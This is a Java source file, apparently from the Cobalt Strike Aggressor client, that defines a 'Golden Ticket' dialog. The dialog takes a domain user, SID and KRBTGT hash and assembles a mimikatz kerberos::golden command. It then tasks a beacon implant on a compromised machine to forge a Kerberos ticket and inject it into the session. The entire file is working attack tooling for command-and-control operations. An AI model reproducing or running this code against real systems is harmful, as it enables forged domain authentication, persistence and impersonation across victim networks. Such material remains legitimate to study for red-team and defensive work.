package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.TaskBeacon;
import common.CommonUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import java.awt.event.ActionEvent;
import java.io.IOException;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class GoldenTicketDialog implements DialogListener {

    protected JFrame dialog = null;

    protected AggressorClient client = null;

    protected String bid = null;

    public GoldenTicketDialog(AggressorClient aggressorClient, String string) {
        this.client = aggressorClient;
        this.bid = string;
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        StringBuffer stringBuffer = new StringBuffer("kerberos::golden /user:");
        stringBuffer.append(DialogUtils.string(map, "user"));
        stringBuffer.append(" /domain:");
        stringBuffer.append(DialogUtils.string(map, "domain"));
        stringBuffer.append(" /sid:");
        stringBuffer.append(DialogUtils.string(map, "sid"));
        stringBuffer.append(" /krbtgt:");
        stringBuffer.append(DialogUtils.string(map, "hash"));
        stringBuffer.append(" /endin:480 /renewmax:10080 /ptt");
        TaskBeacon taskBeacon = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
        DialogUtils.openOrActivate(this.client, this.bid);
        taskBeacon.input("mimikatz " + stringBuffer.toString());
        taskBeacon.MimikatzSmall(stringBuffer.toString());
        this.client.getConnection().call("armitage.broadcast", CommonUtils.args("goldenticket", map));
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog("Golden Ticket", 640, 480);
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        dialogManager.set(DataUtils.getGoldenTicket(this.client.getData()));
        dialogManager.text("user", "User:", 20);
        dialogManager.text("domain", "Domain:", 20);
        dialogManager.text("sid", "Domain SID:", 20);
        dialogManager.krbtgt("hash", "KRBTGT Hash:", this.client);
        JButton jButton1 = dialogManager.action("Build");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-golden-ticket");
        this.dialog.add(DialogUtils.description("This dialog generates a golden ticket and injects it into the current session."), "North");
        this.dialog.add(dialogManager.layout(), "Center");
        this.dialog.add(DialogUtils.center(jButton1, jButton2), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}
